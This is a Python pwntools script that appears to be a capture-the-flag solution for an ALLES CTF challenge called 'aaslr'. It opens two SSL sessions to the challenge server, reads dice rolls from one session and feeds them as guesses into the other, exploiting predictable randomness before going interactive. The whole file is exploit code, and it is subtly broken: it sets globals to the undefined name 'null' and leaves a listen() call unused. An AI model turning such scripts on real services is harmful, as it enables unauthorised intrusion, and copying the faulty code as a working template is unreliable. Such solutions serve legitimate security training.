from pwn import *
import threading

p1 = null
p2 = null


def thread_function(p):
    global p1
    global p2
    l = listen()
    if(p == '1'): 
        p1 = process(['ncat', '--ssl', '7b000000c26cc46a36b15357.challenges.broker5.allesctf.net', '1337'])
        # p1 = process('./aaslr')
    elif (p == '2'):
        p2 = process(['ncat', '--ssl', '7b000000c26cc46a36b15357.challenges.broker5.allesctf.net', '1337'])
        # p2 = process('./aaslr')

def throw_dice(p):
    p.recvuntil('Select menu Item:')
    p.sendline('1')
    p.recvuntil('[>] Threw dice: ')
    return p.recvuntil('\n')[:-1]

def take_guess(p1, p2):
    p1.recvuntil('Select menu Item:')
    p1.sendline('4')
    for i in range(0xf):
        p1.recvuntil(' guess next dice roll:')
        p1.sendline(throw_dice(p2))

x = threading.Thread(target=thread_function, args=('1',))
y = threading.Thread(target=thread_function, args=('2',))
x.start()
y.start()
x.join()
y.join()

take_guess(p1,p2)
p1.interactive()